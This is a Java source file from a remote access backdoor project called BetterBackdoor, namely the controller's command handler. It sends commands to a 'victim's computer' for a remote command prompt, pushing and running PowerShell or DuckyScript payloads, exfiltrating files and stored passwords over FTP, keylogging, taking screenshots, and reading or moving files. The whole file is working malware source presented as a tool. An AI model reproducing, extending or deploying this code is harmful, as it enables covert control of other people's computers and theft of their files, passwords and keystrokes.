package dev.thatcherclough.betterbackdoor.shell;

import java.io.File;
import java.io.IOException;
import java.security.InvalidKeyException;
import java.security.NoSuchAlgorithmException;

import dev.thatcherclough.betterbackdoor.BetterBackdoor;
import dev.thatcherclough.betterbackdoor.backend.FTP;
import dev.thatcherclough.betterbackdoor.backend.Utils;

import org.apache.commons.io.FileUtils;

import javax.crypto.BadPaddingException;
import javax.crypto.IllegalBlockSizeException;
import javax.crypto.NoSuchPaddingException;

public class HandleCommand {

	/**
	 * Handles command {@code command} given by user.
	 *
	 * @param command command given by user
	 * @throws IOException
	 */
	public static void handle(String command) throws IOException, ClassNotFoundException, InvalidKeyException, BadPaddingException, NoSuchAlgorithmException,
			IllegalBlockSizeException, NoSuchPaddingException {
		switch (command) {
			case "cmd":
				System.out.println(
						"Commands will now be executed through vitim's computer's Command Prompt\nEnter 'back' to go back");
				while (true) {
					send("current-cmd-dir");
					System.out.print(getResp());
					String cmdCommand = BetterBackdoor.getInput("");
					if (cmdCommand.equals("back"))
						break;
					send("cmd " + cmdCommand);
					Shell.out.flush();
					System.out.println(getResp());
				}
				break;
			case "ps":
			case "ds": {
				System.out.print("This will send a local ");
				if (command.equals("ps"))
					System.out.print("PowerShell script ");
				else
					System.out.print("DuckyScript");
				System.out.println(" to the victims computer, execute it, and delete it.");
				System.out.println("Enter local filepath of script:");
				File file = new File(BetterBackdoor.getInput("file"));
				System.out.println("Sending script...");
				send("filesend " + file.getName());
				Shell.out.flush();
				FTP.shell(file.getAbsolutePath(), "send");
				System.out.println(getResp());
				System.out.println("Running script...");
				send(command + " " + file.getName());
				System.out.println(getResp());
				break;
			}
			case "exfiles": {
				System.out.println(
						"This will copy files with desired extensions from a folder and all it's subfolders to a ZIP file, send the ZIP file to this computer, " +
								"and delete the original ZIP file from the victim's computer.");
				System.out.println("Enter victim's directory to search through:");
				String root = BetterBackdoor.getInput("");
				send("filetype " + root);
				Shell.out.flush();
				String filetype = getResp();
				if (filetype.equals("file")) {
					System.out.println("You entered a file. Invalid input.");
				} else if (filetype.equals("not real")) {
					System.out.println("No such directory");
				} else {
					System.out.println("Enter extensions of files separated by commas (i.e. txt,pdf,docx)");
					String exts = BetterBackdoor.getInput("");
					send("exfiles " + root + "*" + exts);
					Shell.out.flush();
					System.out.println("Receiving files to '" + System.getProperty("user.dir") + File.separator + "gathered"
							+ File.separator + "ExfiltartedFiles.zip'...");
					FTP.shell("gathered" + File.separator + "ExfiltratedFiles.zip", "rec");
					System.out.println(getResp());
				}
				break;
			}
			case "expass":
				send("expass");
				Shell.out.flush();
				System.out.println("Receiving passwords to '" + System.getProperty("user.dir") + File.separator + "gathered"
						+ File.separator + "ExfiltratedPasswords.zip'...");
				FTP.shell("gathered" + File.separator + "ExfiltratedPasswords.zip", "rec");
				System.out.println(getResp());
				break;
			case "filesend": {
				System.out.println("Enter local filepath of file to send:");
				String fileSend = BetterBackdoor.getInput("file");

				File file = new File(fileSend);
				if (file.isFile())
					System.out.println("Enter victim's filepath of file to receive:");
				else if (file.isDirectory()) {
					System.out.println("You entered a directory. It will be compressed and then sent.");
					System.out.println("Enter victim's filepath of ZIP file to receive:");
				} else
					System.out.println("No such file or directory");

				if (file.exists()) {
					String fileRec = BetterBackdoor.getInput("");
					send("filesend " + fileRec);
					Shell.out.flush();
					if (file.isDirectory()) {
						Utils.zipDir(file.getAbsolutePath());
						FTP.shell(file.getAbsolutePath() + ".zip", "send");
					} else
						FTP.shell(file.getAbsolutePath(), "send");
					System.out.println(getResp());
					if (file.isDirectory())
						FileUtils.forceDelete(new File(file.getAbsolutePath() + ".zip"));
				}
				break;
			}
			case "filerec": {
				System.out.println("Enter victim's filepath of file to send:");
				String fileSend = BetterBackdoor.getInput("");

				send("filetype " + fileSend);
				Shell.out.flush();
				String filetype = getResp();
				if (filetype.equals("file"))
					System.out.println("Enter local filepath of file to receive:");
				else if (filetype.equals("directory")) {
					System.out.println("You entered a directory. It will be compressed and then received.");
					System.out.println("Enter local filepath of ZIP file to receive:");
				} else
					System.out.println("No such file or directory");

				if (!filetype.equals("not real")) {
					String fileRec = BetterBackdoor.getInput("");
					send("filerec " + fileSend);
					Shell.out.flush();
					FTP.shell(fileRec, "rec");
					System.out.println(getResp());
				}
				break;
			}
			case "keylog":
				send("current-dir");
				Shell.out.flush();
				String currentDrive = getResp().substring(0, 2);
				send("cmd echo %USERNAME%");
				Shell.out.flush();
				String currentUser = getResp().replaceAll(" ", "");

				String logFileDir = "C:\\Users\\" + currentUser + "\\AppData\\Gathered";
				if (!currentDrive.equals("C:")) {
					System.out.println("The backdoor is running from drive " + currentDrive.substring(0, 1)
							+ ". Where should keys be logged?");
					System.out.println("[0] " + logFileDir + "\\keys.log");
					System.out.println("[1] " + currentDrive + "\\keys.log");
					String dirChoice = BetterBackdoor.getInput("op01");
					if (dirChoice.equals("1"))
						logFileDir = currentDrive;
				}
				send("keylog " + logFileDir);
				Shell.out.flush();
				System.out.println(getResp());
				break;
			case "ss":
				send("ss");
				Shell.out.flush();
				System.out.println("Receiving screenshot to '" + System.getProperty("user.dir") + File.separator
						+ "gathered" + File.separator + "screenshot.png'...");
				FTP.shell("gathered" + File.separator + "screenshot.png", "rec");
				System.out.println(getResp());
				break;
			case "cat":
				System.out.println("Enter victim's filepath of file to get contents of:");
				send("cat " + BetterBackdoor.getInput(""));
				Shell.out.flush();
				System.out.println(getResp());
				break;
			case "zip":
				System.out.println("Enter victim's filepath of directory to compress:");
				send("zip " + BetterBackdoor.getInput(""));
				Shell.out.flush();
				System.out.println(getResp());
				break;
			case "unzip":
				System.out.println("Enter victim's filepath of ZIP file to decompress:");
				send("unzip " + BetterBackdoor.getInput(""));
				Shell.out.flush();
				System.out.println(getResp());
				break;
			case "exit":
				System.exit(0);
			default:
				send(command);
				Shell.out.flush();
				System.out.println(getResp());
				break;
		}
	}

	private static void send(String toSend) throws IOException, IllegalBlockSizeException, InvalidKeyException, BadPaddingException, NoSuchAlgorithmException,
			NoSuchPaddingException {
		if (Shell.key != null)
			Shell.out.writeObject(Utils.encrypt(toSend, Shell.key));
		else
			Shell.out.writeObject(toSend);
	}

	/**
	 * Gets response from client.
	 *
	 * @return response from client
	 */
	private static String getResp() throws IOException, ClassNotFoundException, IllegalBlockSizeException, InvalidKeyException, BadPaddingException, NoSuchAlgorithmException
			, NoSuchPaddingException {
		String ret;
		String resp = (String) Shell.in.readObject();
		if (Shell.key != null)
			ret = Utils.decrypt(resp, Shell.key);
		else
			ret = resp;

		return ret;
	}
}